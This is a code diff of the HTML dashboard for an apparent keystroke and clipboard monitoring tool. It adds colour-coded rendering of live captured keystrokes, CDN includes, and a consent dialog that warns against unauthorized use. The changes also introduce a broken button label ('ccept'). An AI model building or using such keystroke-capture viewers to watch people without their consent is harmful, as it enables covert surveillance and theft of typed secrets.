@@ -6,11 +6,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{{ app_name }} — Web Dashboard</title>
     <meta name="description" content="{{ app_tagline }}">
-    <link rel="preconnect" href="https:
-    <link
-        href="https:
-        rel="stylesheet">
-    <script src="https:
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <style>
         :root {
             --bg-darkest: #050510;
@@ -547,7 +545,7 @@
             font-family: var(--mono);
             font-size: 14px;
             line-height: 1.7;
-            color: var(--green);
+            color: var(--text);
             white-space: pre-wrap;
             word-break: break-all;
         }
@@ -561,6 +559,18 @@
             font-size: 14px;
             text-align: center;
         }
+
+        /* Keystroke color classes */
+        .key-char     { color: #00e5ff; }                               /* regular typed characters — bright cyan */
+        .key-space    { color: #78909c; opacity: .6; }                  /* space dot — subtle grey */
+        .key-enter    { color: #ff9100; font-weight: 700; }             /* enter — orange */
+        .key-tab      { color: #ffd600; font-weight: 600; }             /* tab — yellow */
+        .key-back     { color: #ff1744; font-weight: 600; }             /* backspace — red */
+        .key-delete   { color: #ff5252; }                               /* delete — lighter red */
+        .key-mod      { color: #e040fb; font-weight: 600; font-size: 11px; }  /* modifiers (shift/ctrl/alt/caps) — magenta */
+        .key-nav      { color: #7c4dff; font-weight: 600; font-size: 11px; }  /* arrows, home/end, pgup/dn — purple */
+        .key-fn       { color: #00bfa5; font-weight: 600; font-size: 11px; }  /* F1–F12 — teal */
+        .key-misc     { color: #b0bec5; font-size: 11px; }              /* esc, insert, prtsc, etc. */
 
         .controls-bar {
             display: flex;
@@ -1162,8 +1172,8 @@
             <div class="warning">⚠️ Unauthorized use of monitoring tools is illegal and unethical. Violation may result
                 in criminal prosecution.</div>
             <div class="btn-row">
-                <button class="btn-decline" onclick="declineConsent()">❌ Decline</button>
-                <button class="btn-accept" onclick="acceptConsent()">✅ Accept & Continue</button>
+                <button class="btn-decline" onclick="declineConsent()">Decline</button>
+                <button class="btn-accept" onclick="acceptConsent()">ccept & Continue</button>
             </div>
         </div>
     </div>
@@ -1266,13 +1276,32 @@
         socket.on('keystroke', data => {
             const feed = document.getElementById('kl-feed');
             if (!klFeedStarted) {
-                feed.textContent = '';
+                feed.innerHTML = '';
                 feed.classList.remove('empty');
                 klFeedStarted = true;
             }
-            feed.textContent += data.key || '';
+            const k = data.key || '';
+            const span = document.createElement('span');
+            span.className = classifyKey(k);
+            span.textContent = k;
+            feed.appendChild(span);
             feed.scrollTop = feed.scrollHeight;
         });
+
+        function classifyKey(k) {
+            const t = k.trim().toUpperCase();
+            if (t === '[SPACE]')    return 'key-space';
+            if (t === '[ENTER]')    return 'key-enter';
+            if (t === '[TAB]')      return 'key-tab';
+            if (t === '[BACKSPACE]') return 'key-back';
+            if (t === '[DELETE]')   return 'key-delete';
+            if (['[SHIFT]','[R_SHIFT]','[L_CTRL]','[R_CTRL]','[L_ALT]','[R_ALT]','[CAPSLOCK]'].includes(t)) return 'key-mod';
+            if (['[UP]','[DOWN]','[LEFT]','[RIGHT]','[HOME]','[END]','[PGUP]','[PGDN]'].includes(t)) return 'key-nav';
+            if (/^\[F\d{1,2}\]$/.test(t)) return 'key-fn';
+            if (['[ESC]','[INSERT]','[PRTSC]'].includes(t)) return 'key-misc';
+            if (t.startsWith('[') && t.endsWith(']')) return 'key-misc';
+            return 'key-char';
+        }
 
         
         socket.on('clipboard_update', data => {
@@ -1336,7 +1365,7 @@
 
         function clearFeed() {
             const feed = document.getElementById('kl-feed');
-            feed.textContent = 'Waiting for keystrokes…\nStart monitoring to see live capture.';
+            feed.innerHTML = 'Waiting for keystrokes…<br>Start monitoring to see live capture.';
             feed.classList.add('empty');
             klFeedStarted = false;
         }
